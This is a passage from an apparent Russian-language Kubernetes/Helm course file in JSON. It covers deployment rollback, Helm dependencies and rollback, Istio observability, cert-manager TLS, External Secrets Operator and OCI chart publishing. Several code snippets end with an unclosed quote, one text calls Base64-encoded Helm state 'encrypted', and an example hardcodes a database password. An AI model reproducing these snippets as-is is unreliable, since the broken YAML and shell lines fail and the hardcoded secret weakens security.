    "theory": "Откат развертывания — критически важная аварийная процедура при обнаружении багов в production:\n1. **Концепция ревизий:**\n   - Каждый раз, когда изменяется `spec.template` в объекте Deployment, Kubernetes создает новую **ревизию (Revision)**.\n   - История ревизий сохраняется благодаря сохранению старых объектов **ReplicaSet** с масштабом `replicas: 0`.\n2. **Команда `kubectl rollout undo`:**\n   - `kubectl rollout undo deployment/<name>` — откат к предыдущей успешной ревизии (N-1).\n   - `kubectl rollout undo deployment/<name> --to-revision=2` — откат к конкретной исторической ревизии номер 2.\n3. **Параметр `revisionHistoryLimit`:**\n   - По умолчанию K8s сохраняет 10 последних ReplicaSet. Если этот параметр установлен в 0, история не сохраняется, и откат через `rollout undo` становится невозможным!",
    "step_by_step": "1. Проверьте текущую историю выкаток: `kubectl rollout history deployment/my-app`.\n2. Посмотрите детали конкретной ревизии: `kubectl rollout history deployment/my-app --revision=1`.\n3. Выполните команду отката: `kubectl rollout undo deployment/my-app`.\n4. Отследите завершение отката: `kubectl rollout status deployment/my-app`.\n5. Убедитесь, что поды перешли на стабильный образ предыдущей версии.",
    "code_blocks": [
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Просмотр истории релизов с номерами ревизий и аннотациями изменений\nkubectl rollout history deployment/my-app\n\n# Детальный просмотр ревизии 1 (какой образ использовался)\nkubectl rollout history deployment/my-app --revision=1\n\n# Откат к предыдущей стабильной ревизии\nkubectl rollout undo deployment/my-app\n\n# Откат к конкретной исторической ревизии 2\nkubectl rollout undo deployment/my-app --to-revision=2\n\n# Проверка успешного завершения отката\nkubectl rollout status deployment/my-app"
      },
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-app\n  namespace: default\n  annotations:\n    kubernetes.io/change-cause: \"Release v1.0.0 stable with memory leak fix\"\nspec:\n  revisionHistoryLimit: 10\n  replicas: 3\n  selector:\n    matchLabels:\n      app: my-app\n  template:\n    metadata:\n      labels:\n        app: my-app\n    spec:\n      containers:\n        - name: app\n          image: my-app:v1.0.0\n          ports:\n            - containerPort: 8080"
      }
    ],
    "under_the_hood": "При вызове `rollout undo` контроллер `deployment-controller` находит исторический ReplicaSet, соответствующий целевой ревизии. Контроллер копирует спецификацию `spec.template` из этого ReplicaSet обратно в `spec.template` объекта Deployment и увеличивает счетчик ревизий (например, если текущая была 3, а откат делается к 1, создается ревизия 4 с шаблоном из 1). Запускается стандартный процесс Rolling Update в обратную сторону: старый дефектный ReplicaSet масштабируется до 0, а проверенный масштабируется до требуемого количества реплик.",
    "pitfalls": "1. Установка `revisionHistoryLimit: 0`: приводит к немедленному удалению неактивных ReplicaSet, делая команду `kubectl rollout undo` бесполезной.\n2. Несовместимость базы данных: если дефектная версия `v1.1.0` успела применить деструктивную миграцию схемы БД (например, удалила колонку), откат бинарника через `rollout undo` не восстановит базу данных и может привести к полному падению сервиса. Миграции БД всегда должны быть обратно совместимыми.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему в современных процессах GitOps (ArgoCD, Flux) команду `kubectl rollout undo` считают временным антипаттерном или экстренной мерой?»\n**Ответ:** Команда `kubectl rollout undo` изменяет состояние кластера напрямую в обход Git. Если в Git-репозитории остался закоммичен манифест с дефектным образом `v1.1.0`, GitOps-контроллер (ArgoCD) через несколько минут обнаружит дрифт (Out-of-Sync), автоматически применит манифест из Git и вернет багованную версию обратно в кластер! В правильном GitOps-процессе откат выполняется через `git revert` коммита в Git."
  },
  {
    "num": 108,
    "title": "Управление зависимостями Helm: интеграция Bitnami PostgreSQL",
    "task": "**[Helm Dependencies]**: В `Chart.yaml` добавь зависимость от PostgreSQL (Bitnami chart). Установи чарт так, чтобы вместе с приложением поднялась база данных.",
    "theory": "Интеграция сторонних инфраструктурных сервисов через зависимости Helm:\n1. **Конфигурация в `Chart.yaml`:**\n   - `name`: имя чарта в удаленном репозитории (`postgresql`).\n   - `version`: semver-диапазон версии чарта (`12.x.x` или `^12.1.0`).\n   - `repository`: URL официального Helm-репозитория (например, `https://charts.bitnami.com/bitnami` или OCI `oci://registry-1.docker.io/bitnamicharts`).\n2. **Передача учетных данных и сетевое взаимодействие:**\n   - Дочерний чарт PostgreSQL автоматически создает Service с именем `<release-name>-postgresql`.\n   - Основное Go-приложение подключается к СУБД по внутреннему DNS-имени: `<release-name>-postgresql.default.svc.cluster.local:5432`.\n   - Пароль от БД извлекается из секрета, генерируемого чартом Bitnami.",
    "step_by_step": "1. Добавьте блок `dependencies` в `Chart.yaml`.\n2. Запустите `helm dependency update ./myapp`.\n3. В `values.yaml` настройте имя базы данных, пользователя и пароль.\n4. В `templates/deployment.yaml` передайте Go-приложению строку подключения к БД.\n5. Установите чарт и убедитесь, что поднялись поды приложения и PostgreSQL.",
    "code_blocks": [
      {
        "filename": "Chart.yaml",
        "lang": "yaml",
        "code": "apiVersion: v2\nname: store-service\ndescription: Сервис интернет-магазина со встроенной БД PostgreSQL\nversion: 1.0.0\nappVersion: \"1.0.0\"\n\ndependencies:\n  - name: postgresql\n    version: \"12.5.6\"\n    repository: \"https://charts.bitnami.com/bitnami"
      },
      {
        "filename": "values.yaml",
        "lang": "yaml",
        "code": "replicaCount: 2\n\nimage:\n  repository: store-service\n  tag: \"1.0.0\"\n\n# Переопределение конфигурации дочернего чарта postgresql\npostgresql:\n  auth:\n    database: store_db\n    username: store_admin\n    password: SuperSecretStorePassword2026!\n  primary:\n    persistence:\n      enabled: false # Для локальных тестов отключаем persistent disk"
      },
      {
        "filename": "templates/deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: {{ .Release.Name }}-store\nspec:\n  replicas: {{ .Values.replicaCount }}\n  selector:\n    matchLabels:\n      app: {{ .Release.Name }}-store\n  template:\n    metadata:\n      labels:\n        app: {{ .Release.Name }}-store\n    spec:\n      containers:\n        - name: store\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag }}\"\n          env:\n            - name: DB_HOST\n              value: \"{{ .Release.Name }}-postgresql\"\n            - name: DB_PORT\n              value: \"5432\"\n            - name: DB_USER\n              value: {{ .Values.postgresql.auth.username | quote }}\n            - name: DB_NAME\n              value: {{ .Values.postgresql.auth.database | quote }}\n            - name: DB_PASSWORD\n              valueFrom:\n                secretKeyRef:\n                  name: {{ .Release.Name }}-postgresql\n                  key: password"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Скачивание архива зависимости в папку charts/\nhelm dependency update ./store-service\n\n# Установка композитного приложения\nhelm install store-demo ./store-service\n\n# Проверка поднявшихся подов приложения и БД\nkubectl get pods -l \"app.kubernetes.io/instance=store-demo"
      }
    ],
    "under_the_hood": "Команда `helm dependency update` выполняет валидацию архива dependencies, распаковывает метаданные и формирует файл `Chart.lock`. При установке Helm рендерит манифесты обоих чартов в единую транзакцию. Kubernetes сначала создает Secret и StatefulSet базы данных, а затем Deployment приложения. Механизм Service Discovery K8s обеспечивает разрешение DNS-имени `store-demo-postgresql` в виртуальный IP базы данных.",
    "pitfalls": "1. Забытый вызов `helm dependency update`: если директория `charts/` пуста и `Chart.lock` отсутствует, `helm install` выдаст ошибку `found in Chart.yaml, but missing in charts/ directory`.\n2. Жестко закодированный хост базы данных: указание фиксированного хоста `postgresql` вместо `{{ .Release.Name }}-postgresql` приведет к конфликту и падению при установке нескольких копий чарта в один namespace.",
    "bigtech_interview": "**Вопрос с собеседования:** «Как в Helm чарте со встроенным Subchart PostgreSQL передать пароль так, чтобы не хранить его в `values.yaml` открытым текстом?»\n**Ответ:** 1) Использовать параметр `postgresql.auth.existingSecret`, передав имя предварительно созданного в кластере Secret'а; 2) Передать пароль через аргумент командной строки `--set postgresql.auth.password=$PROD_DB_PASS` из защищенных переменных CI/CD; 3) Использовать External Secrets Operator или Sealed Secrets."
  },
  {
    "num": 109,
    "title": "Istio Observability: топология Kiali, метрики Grafana и распределенная трассировка Jaeger",
    "task": "Настрой **Istio Observability**: Kiali (topology), Grafana (metrics), Jaeger (tracing). `Telemetry` resource for custom metrics. Покажи unified observability without application changes.",
    "theory": "Одно из главных преимуществ Service Mesh — автоматическая наблюдаемость (Observability) сетевого стека без внесения изменений в код сервисов (Zero Code Instrumentation):\n1. **Kiali (Service Topology):** Консоль визуализации графа микросервисов, сетевых потоков, частоты ошибок HTTP 5xx, состояния mTLS и валидации конфигураций Istio в реальном времени.\n2. **Prometheus & Grafana:** Envoy sidecar собирает и экспортирует детальные метрики на порт `:15090/stats/prometheus` (RPS, задержки p50/p95/p99, входящий/исходящий трафик). Grafana предоставляет готовые дашборды (Istio Mesh, Istio Service, Istio Workload).\n3. **Jaeger / Zipkin (Distributed Tracing):** Envoy автоматически перехватывает HTTP-запросы и генерирует спаны трассировки.\n4. **Важное требование к коду на Go:** Хотя сам сбор спанов выполняет Envoy, приложение на Go ОБЯЗАНО пробрасывать входящие заголовки трассировки (`traceparent`, `x-request-id`, `x-b3-traceid`) в исходящие HTTP-запросы к другим микросервисам!",
    "step_by_step": "1. Установите аддоны телеметрии Istio (Kiali, Prometheus, Grafana, Jaeger).\n2. Напишите Go-микросервис, корректно пересылающий W3C/B3 заголовки трассировки.\n3. Создайте манифест Istio `Telemetry` для кастомизации метрик.\n4. Сгенерируйте нагрузку и откройте дашборд Kiali через `istioctl dashboard kiali`.",
    "code_blocks": [
      {
        "filename": "telemetry.yaml",
        "lang": "yaml",
        "code": "apiVersion: telemetry.istio.io/v1alpha1\nkind: Telemetry\nmetadata:\n  name: mesh-telemetry\n  namespace: default\nspec:\n  tracing:\n    - providers:\n        - name: \"zipkin\"\n      randomSamplingPercentage: 100.0\n  metrics:\n    - providers:\n        - name: \"prometheus\"\n      overrides:\n        - match:\n            metric: REQUEST_COUNT\n          tagOverrides:\n            request_protocol:\n              value: \"request.protocol"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"net/http\"\n)\n\n// Список заголовков распределенной трассировки, которые Envoy ожидает для связывания спанов\nvar traceHeaders = []string{\n\t\"x-request-id\",\n\t\"x-b3-traceid\",\n\t\"x-b3-spanid\",\n\t\"x-b3-sampled\",\n\t\"x-b3-flags\",\n\t\"traceparent\",\n\t\"tracestate\",\n}\n\nfunc forwardWithTracing(inReq *http.Request, targetURL string) ([]byte, error) {\n\toutReq, err := http.NewRequestWithContext(inReq.Context(), http.MethodGet, targetURL, nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\t// Критически важно: копируем заголовки трассировки из входящего запроса в исходящий\n\tfor _, h := range traceHeaders {\n\t\tif val := inReq.Header.Get(h); val != \"\" {\n\t\t\toutReq.Header.Set(h, val)\n\t\t}\n\t}\n\n\tresp, err := http.DefaultClient.Do(outReq)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer resp.Body.Close()\n\n\treturn io.ReadAll(resp.Body)\n}\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tbody, err := forwardWithTracing(r, \"http://billing-service:8080/process\")\n\tif err != nil {\n\t\thttp.Error(w, fmt.Sprintf(\"Downstream error: %v\", err), http.StatusBadGateway)\n\t\treturn\n\t}\n\tw.WriteHeader(http.StatusOK)\n\t_, _ = w.Write([]byte(fmt.Sprintf(\"Client OK. Downstream response: %s\", string(body))))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/api/order\", handler)\n\tlog.Println(\"Сервис запущен с поддержкой проброса трейсинга на :8080\")\n\t_ = http.ListenAndServe(\":8080\", nil)\n}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Установка официальных семплов телеметрии Istio\nkubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/kiali.yaml\nkubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/prometheus.yaml\nkubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/grafana.yaml\nkubectl apply -f https://raw.githubusercontent.com/istio/istio/release-1.20/samples/addons/jaeger.yaml\n\n# Запуск дашборда Kiali в браузере\nistioctl dashboard kiali"
      }
    ],
    "under_the_hood": "Когда запрос попадает во входящий прокси Envoy, тот проверяет наличие заголовков B3/W3C. Если их нет, Envoy генерирует новый Trace ID и Span ID. Перед отправкой запроса в локальный контейнер Go Envoy внедряет эти заголовки в HTTP-запрос. При исходящем запросе приложения к downstream-сервису, если Go скопировал заголовки, исходящий Envoy считывает их, создает дочерний спан и асинхронно отправляет gRPC-пакет с телеметрией в коллектор Jaeger/Zipkin.",
    "pitfalls": "1. Прерывание цепочки трейсинга: если разработчик забудет скопировать заголовки `traceparent` или `x-request-id` в коде Go, трассировка разобьется на несвязанные куски, и в Jaeger вместо единого сквозного дерева запроса появятся разрозненные спаны.\n2. Семплирование 100% в HighLoad: сбор 100% спанов при нагрузке 50 000 RPS создаст колоссальный паразитный сетевой трафик и переполнит хранилище Jaeger/OpenSearch. В проде выставляют `randomSamplingPercentage: 1.0` (1%) или адаптивный сэмплинг.",
    "bigtech_interview": "**Вопрос с собеседования:** «Зачем приложению на Go пересылать заголовки трейсинга, если Envoy перехватывает весь сетевой трафик?»\n**Ответ:** Envoy проксирует трафик на уровне L4/L7, но не знает бизнес-логики приложения: когда в Go-сервис приходит входящий HTTP-запрос A, а через 5 миллисекунд сервис инициирует исходящий запрос B к базе или другому микросервису, только само приложение знает, что запрос B является прямым следствием запроса A. Без явного проброса заголовков (`traceparent`) Envoy не сможет связать эти два сетевых события в единую транзакцию (Trace)."
  },
  {
    "num": 110,
    "title": "Автоматизация TLS: Cert-Manager, ClusterIssuer и Let's Encrypt",
    "task": "Установи **Cert-manager**: `ClusterIssuer` for Let's Encrypt (production/staging). `Certificate` resource automatically requests and renews TLS certificates. `Ingress` or `Gateway` references secret. Покажи automated TLS.",
    "theory": "Ручной выпуск и обновление SSL/TLS-сертификатов — источник частых сбоев в продакшене из-за человеческого фактора (забыли продлить сертификат вовремя).\n**Cert-Manager** — оператор Kubernetes для автоматизации выпуска и ротации TLS-сертификатов:\n1. **Компоненты и CRD:**\n   - **`Issuer` / `ClusterIssuer`**: определяет удостоверяющий центр (CA), например ACME-сервер Let's Encrypt, корпоративный HashiCorp Vault или локальный CA. `ClusterIssuer` доступен во всех namespace кластера.\n   - **`Certificate`**: объявляет желаемый сертификат (доменные имена, Secret для сохранения ключей, срок обновления).\n2. **Типы ACME-челленджей (Let's Encrypt):**\n   - **HTTP-01:** Cert-Manager создает временный Pod и правило в Ingress для отдачи проверочного токена по пути `http://<domain>/.well-known/acme-challenge/<token>`. Требует публичного белого IP-адреса.\n   - **DNS-01:** Cert-Manager создает временную TXT-запись в DNS-зоне через API провайдера (Cloudflare, AWS Route53). Позволяет выпускать wildcard-сертификаты (`*.example.com`).\n3. **Интеграция с Ingress:** Аннотация `cert-manager.io/cluster-issuer: letsencrypt-prod` автоматически заставляет cert-manager выпустить сертификат для хостов из секции `tls`.",
    "step_by_step": "1. Установите Cert-Manager через официальные CRD-манифесты.\n2. Создайте `ClusterIssuer` для Let's Encrypt с протоколом ACME HTTP-01.\n3. Настройте `Ingress` с аннотацией вызова ClusterIssuer и секцией `tls`.\n4. Отследите прохождение ACME-челленджа через `kubectl get certificate,order,challenge`.\n5. Проверьте созданный Kubernetes Secret с приватным ключом `tls.key` и сертификатом `tls.crt`.",
    "code_blocks": [
      {
        "filename": "cluster-issuer.yaml",
        "lang": "yaml",
        "code": "apiVersion: cert-manager.io/v1\nkind: ClusterIssuer\nmetadata:\n  name: letsencrypt-prod\nspec:\n  acme:\n    server: https://acme-v02.api.letsencrypt.org/directory\n    email: devops@example.com\n    privateKeySecretRef:\n      name: letsencrypt-prod-account-key\n    solvers:\n      - http01:\n          ingress:\n            class: nginx"
      },
      {
        "filename": "ingress-tls.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: secure-ingress\n  namespace: default\n  annotations:\n    cert-manager.io/cluster-issuer: \"letsencrypt-prod\"\n    nginx.ingress.kubernetes.io/ssl-redirect: \"true\"\nspec:\n  ingressClassName: nginx\n  tls:\n    - hosts:\n        - api.mycompany.com\n      secretName: api-mycompany-tls-cert\n  rules:\n    - host: api.mycompany.com\n      http:\n        paths:\n          - path: /\n            pathType: Prefix\n            backend:\n              service:\n                name: api-service\n                port:\n                  number: 8080"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Установка cert-manager с манифестами CRD\nkubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.3/cert-manager.yaml\n\n# Применение конфигурации ClusterIssuer и Ingress\nkubectl apply -f cluster-issuer.yaml\nkubectl apply -f ingress-tls.yaml\n\n# Отслеживание процесса выпуска сертификата\nkubectl get certificate api-mycompany-tls-cert\n# NAME                       READY   SECRET                      AGE\n# api-mycompany-tls-cert     True    api-mycompany-tls-cert      45s\n\n# Проверка содержимого сгенерированного секрета\nkubectl get secret api-mycompany-tls-cert -o yaml | grep \"tls.crt:"
      }
    ],
    "under_the_hood": "Когда Ingress создается с аннотацией `cert-manager.io/cluster-issuer`, контроллер `cert-manager-ingress-shim` генерирует ресурс `Certificate`. Основной контроллер `cert-manager` создает объект `Order` и `Challenge`. Контроллер поднимает временный pod-респондер и настраивает Ingress routing для пути `/.well-known/acme-challenge/*`. Серверы Let's Encrypt обращаются по HTTP к этому пути, подтверждают владение доменом и выпускают X.509 сертификат, который Cert-Manager записывает в Secret.",
    "pitfalls": "1. Превышение лимитов (Rate Limits) Let's Encrypt: при тестировании конфигурации на боевом сервере `letsencrypt-prod` частые ошибки приводят к блокировке домена на 7 дней. Для отладки ВСЕГДА используйте `letsencrypt-staging`.\n2. Блокировка порта 80: если файрвол или Cloudflare блокирует HTTP (порт 80), HTTP-01 challenge завершится ошибкой таймаута.",
    "bigtech_interview": "**Вопрос с собеседования:** «За сколько дней до окончания срока действия Cert-Manager начинает процедуру обновления сертификата?»\n**Ответ:** По умолчанию Cert-Manager начинает процедуру автоматического обновления за **30 дней (720 часов)** до истечения срока действия сертификата (при стандартном сроке жизни сертификата Let's Encrypt в 90 дней). Это поведение можно переопределить в манифесте `Certificate` с помощью поля `renewBefore: 360h` (15 дней)."
  },
  {
    "num": 111,
    "title": "Управление жизненным циклом релизов: helm upgrade и helm rollback",
    "task": "Используйте `helm upgrade` для обновления и `helm rollback` для отката.",
    "theory": "Helm отслеживает историю изменений каждого приложения через цепочку **релизов (Releases)**:\n1. **Команда `helm upgrade`:**\n   - Модифицирует существующий релиз: считывает текущее состояние, объединяет новые значения `values` с существующими и выполняет Three-way Merge Patch в Kubernetes.\n   - Флаг `--atomic`: если хотя бы один ресурс (например, Pod) не перешел в состояние Ready в течение таймаута (`--timeout 5m`), Helm автоматически отменяет изменения и возвращает кластер к предыдущей стабильной ревизии.\n   - Флаг `--cleanup-on-fail`: удаляет вновь созданные сущности в случае падения релиза.\n2. **Команда `helm rollback`:**\n   - Возвращает приложение к указанной исторической ревизии: `helm rollback <release-name> <revision-number>`.\n   - При откате создается НОВАЯ ревизия (например, если была ревизия 3, откат к 1 создаст ревизию 4 с конфигурацией ревизии 1).",
    "step_by_step": "1. Установите первую версию приложения: `helm install core-app ./my-chart --set image.tag=v1.0.0`.\n2. Обновите приложение до версии v2.0.0 с флагом `--atomic`: `helm upgrade --atomic core-app ./my-chart --set image.tag=v2.0.0`.\n3. Сымитируйте сбой (указав битый образ) и убедитесь в автоматическом rollback при включенном `--atomic`.\n4. Выполните ручной откат командой `helm rollback core-app 1`.\n5. Проверьте историю ревизий командой `helm history core-app`.",
    "code_blocks": [
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# 1. Первоначальная установка (создает Revision 1)\nhelm install payment-api ./payment-chart --set image.tag=1.0.0 -n default\n\n# 2. Обновление релиза с флагами надежности (создает Revision 2)\nhelm upgrade payment-api ./payment-chart \\\n  --set image.tag=1.1.0 \\\n  --atomic \\\n  --timeout 3m0s \\\n  -n default\n\n# 3. Просмотр всей истории релизов и их статусов\nhelm history payment-api -n default\n# REVISION  UPDATED                   STATUS          CHART              APP VERSION  DESCRIPTION\n# 1         Wed Sep 04 10:00:00 2026  superseded      payment-chart-0.1  1.0.0        Install complete\n# 2         Wed Sep 04 10:15:00 2026  deployed        payment-chart-0.1  1.1.0        Upgrade complete\n\n# 4. Ручной откат к ревизии 1 при обнаружении бизнес-ошибки\nhelm rollback payment-api 1 -n default\n\n# 5. Проверка того, что ревизия 3 является копией ревизии 1\nhelm history payment-api -n default"
      }
    ],
    "under_the_hood": "Helm 3 хранит состояние каждой ревизии в зашифрованном Base64/Gzip объекте `Secret` в том же namespace, где установлен релиз: `sh.helm.release.v1.<release-name>.v<revision>`. При выполнении `helm rollback myapp 1` Helm загружает Secret первой ревизии, декодирует манифест, вычисляет diff относительно текущего состояния кластера и отправляет команды обновления в `kube-apiserver`.",
    "pitfalls": "1. Использование `helm upgrade` без флага `--reuse-values`: если при обновлении передать только один параметр `--set image.tag=v2`, а флаг `--reuse-values` не указан, все предыдущие кастомные values сбросятся к дефолтным значениям чарта!\n2. Зависшие релизы в статусе `pending-upgrade`: если процесс обновления был убит по Ctrl+C или сбоем в CI, релиз блокируется. Требуется ручной откат или удаление блокирующего секрета.",
    "bigtech_interview": "**Вопрос с собеседования:** «Что делает флаг `--atomic` в команде `helm upgrade` и почему его рекомендуется включать во всех CI/CD пайплайнах?»\n**Ответ:** Флаг `--atomic` включает ожидание готовности всех ресурсов (`--wait`). Если в процессе обновления любой Pod упал с ошибкой `CrashLoopBackOff`, не прошел Readiness Probe или время ожидания превысило `--timeout`, Helm автоматически инициирует `helm rollback` к предыдущей стабильной ревизии. Это гарантирует, что упавший деплой не оставит кластер в полуразрушенном (broken) состоянии."
  },
  {
    "num": 112,
    "title": "Управление внешними секретами: External Secrets Operator (ESO) и Vault",
    "task": "Настрой **External Secrets Operator**: `ExternalSecret` syncs secrets from AWS Secrets Manager / Azure Key Vault / HashiCorp Vault to Kubernetes Secrets. Автоматическая ротация. Покажи no secrets in Git.",
    "theory": "Принципы DevSecOps и GitOps запрещают хранение секретов (пароли, приватные ключи, токены API) в Git даже в зашифрованном виде.\n**External Secrets Operator (ESO):**\n1. **Архитектурная схема:**\n   `HashiCorp Vault / AWS Secrets Manager` $\\longrightarrow$ `SecretStore` $\\longrightarrow$ `ExternalSecret` $\\longrightarrow$ `Нативный K8s Secret`\n2. **Ключевые примитивы:**\n   - **`SecretStore` / `ClusterSecretStore`**: описывает способ подключения к внешнему провайдеру секретов (токен Vault, AWS IAM Role via IRSA, GCP Workload Identity).\n   - **`ExternalSecret`**: декларативно указывает, какие ключи из внешнего хранилища нужно периодически вычитывать и в какой локальный Secret кластера синхронизировать.\n3. **Автоматическая ротация:**\n   - Параметр `refreshInterval: 1h` заставляет контроллер ESO раз в час опрашивать Vault и автоматически обновлять K8s Secret при изменении пароля в хранилище.",
    "step_by_step": "1. Установите External Secrets Operator через Helm.\n2. Создайте `SecretStore`, подключенный к корпоративному серверу HashiCorp Vault.\n3. Создайте манифест `ExternalSecret`, запрашивающий пароль базы данных `db-creds`.\n4. Проверьте автоматическое появление стандартного Kubernetes Secret `app-db-secret`.\n5. Убедитесь, что исходные пароли никогда не попадают в Git-репозиторий.",
    "code_blocks": [
      {
        "filename": "secret-store.yaml",
        "lang": "yaml",
        "code": "apiVersion: external-secrets.io/v1beta1\nkind: SecretStore\nmetadata:\n  name: vault-backend\n  namespace: default\nspec:\n  provider:\n    vault:\n      server: \"https://vault.internal.corp:8200\"\n      path: \"secret\"\n      version: \"v2\"\n      auth:\n        kubernetes:\n          mountPath: \"kubernetes\"\n          role: \"backend-app-role"
      },
      {
        "filename": "external-secret.yaml",
        "lang": "yaml",
        "code": "apiVersion: external-secrets.io/v1beta1\nkind: ExternalSecret\nmetadata:\n  name: app-db-external-secret\n  namespace: default\nspec:\n  refreshInterval: \"1h\"\n  secretStoreRef:\n    name: vault-backend\n    kind: SecretStore\n  target:\n    name: app-db-secret # Имя целевого Kubernetes Secret\n    creationPolicy: Owner\n  data:\n    - secretKey: DB_PASSWORD # Ключ в результирующем K8s Secret\n      remoteRef:\n        key: production/database\n        property: password\n    - secretKey: DB_USER\n      remoteRef:\n        key: production/database\n        property: username"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Проверка статуса синхронизации ExternalSecret\nkubectl get externalsecret app-db-external-secret\n# NAME                     STORE           REFRESH INTERVAL   STATUS         READY\n# app-db-external-secret   vault-backend   1h                 SecretSynced   True\n\n# Проверка того, что нативный Kubernetes Secret был автоматически создан\nkubectl get secret app-db-secret -o jsonpath='{.data.DB_USER}' | base64 -d"
      }
    ],
    "under_the_hood": "ESO использует Kubernetes ServiceAccount Token для аутентификации в HashiCorp Vault (метод Vault Kubernetes Auth). Vault валидирует JWT-токен пода контроллера через `TokenReview API` Kubernetes. Получив временный клиентский токен Vault, контроллер ESO делает HTTP GET запрос к API движка KV v2 (`/v1/secret/data/production/database`), парсит JSON-ответ и создает или обновляет нативный `v1/Secret` с владельцем `ownerReferences`.",
    "pitfalls": "1. Забытый перезапуск подов после ротации секрета: обновление нативного Secret в Kubernetes само по себе не перезапускает поды, монтирующие его через переменные окружения `env`. Требуется использовать утилиты вроде **Reloader** (stakater/reloader) для триггера Rolling Update.\n2. Слишком частый `refreshInterval`: интервал в 5 секунд перегрузит API Vault десятками тысяч запросов в больших кластерах. Оптимальное значение — от 10 минут до 1 часа.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему в GitOps-пайплайнах связка External Secrets Operator + HashiCorp Vault считается более надежной, чем Sealed Secrets?»\n**Ответ:** Sealed Secrets требует шифрования секретов открытым ключом кластера и коммита зашифрованного файла в Git. Это создает риски: 1) Ротация паролей требует повторного ручного коммита в репозиторий; 2) При компрометации приватного ключа контроллера расшифровывается вся история коммитов в Git. ESO полностью отделяет хранение секретов от Git: в репозитории хранятся только ссылки на пути в защищенном внешнем хранилище Vault с аудитом доступа и динамической ротацией."
  },
  {
    "num": 113,
    "title": "Публикация и распространение Helm-чартов: OCI Registry и ChartMuseum",
    "task": "Опубликуйте chart в Helm repository (ChartMuseum или GitHub Pages).",
    "theory": "Для распространения и версионирования Helm-чартов между командами и в CI/CD применяются два подхода:\n1. **Традиционный HTTP Helm Repository:**\n   - Веб-сервер (ChartMuseum, Nexus, JFrog Artifactory или статический сайт GitHub Pages).\n   - Содержит tar-архивы (`.tgz`) и корневой файл метаданных `index.yaml`.\n   - Обновление индекса выполняется утилитой `helm repo index .`.\n2. **Современный стандарт OCI Registry (Helm 3.8+):**\n   - Упаковка чартов как OCI-артефактов прямо в Docker Registry (GitHub Packages GHCR, GitLab Registry, Harbor, AWS ECR, Google Artifact Registry).\n   - Команды: `helm package`, `helm push <chart.tgz> oci://registry-url`, `helm pull oci://registry-url`.\n   - Исключает необходимость ведения отдельного `index.yaml`.",
    "step_by_step": "1. Упакуйте чарт в архив `.tgz`: `helm package ./myapp`.\n2. Сгенерируйте `index.yaml` для репозитория: `helm repo index .`.\n3. Опубликуйте чарт в OCI-совместимый реестр контейнеров Harbor или GitHub Packages.\n4. Подключите репозиторий на другой машине: `helm repo add myrepo <URL>`.\n5. Установите чарт напрямую из OCI-реестра.",
    "code_blocks": [
      {
        "filename": "publish_oci.sh",
        "lang": "bash",
        "code": "#!/bin/bash\nset -euo pipefail\n\nCHART_DIR=\"./myapp\"\nREGISTRY_URL=\"oci://ghcr.io/my-org/charts\"\n\necho \"1. Сборка архива Helm чарта...\"\nhelm package \"$CHART_DIR\"\n\nCHART_VERSION=$(grep '^version:' \"$CHART_DIR/Chart.yaml\" | awk '{print $2}')\nARCHIVE_NAME=\"myapp-${CHART_VERSION}.tgz\"\n\necho \"2. Авторизация в OCI Registry...\"\necho \"$GITHUB_TOKEN\" | helm registry login ghcr.io -u \"$GITHUB_USER\" --password-stdin\n\necho \"3. Публикация чарта в OCI реестр...\"\nhelm push \"$ARCHIVE_NAME\" \"$REGISTRY_URL\"\n\necho \"✅ Чарт успешно опубликован: $REGISTRY_URL/myapp:$CHART_VERSION\" "
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Установка чарта напрямую из удаленного OCI-репозитория без команды helm repo add\nhelm install my-app-release oci://ghcr.io/my-org/charts/myapp --version 1.0.0 -n default\n\n# Просмотр информации об удаленном OCI-пакете\nhelm show chart oci://ghcr.io/my-org/charts/myapp --version 1.0.0"
      }
    ],
    "under_the_hood": "В спецификации OCI Artifacts Helm-чарт упаковывается в слой (layer) с медиа-типом `application/vnd.cncf.helm.chart.content.v1.tar+gzip`, а файл `Chart.yaml` сохраняется в манифесте OCI как конфигурационный блоб `application/vnd.cncf.helm.config.v1+json`. Это позволяет OCI-реестрам сканировать чарты, подписывать их ключами Cosign и хранить в едином пайплайне безопасности рядом с Docker-образами.",
    "pitfalls": "1. Неизменяемость версий (Immutability): большинство корпоративных OCI-реестров запрещают перезапись уже существующего тега чарта (`409 Conflict`). При любом изменении необходимо повышать версию в `Chart.yaml`.\n2. Забытая авторизация через `helm registry login`: стандартный `docker login` настраивает файл `~/.docker/config.json`, но для работы с OCI Helm требует явной аутентификации через свой CLI-контекст.",
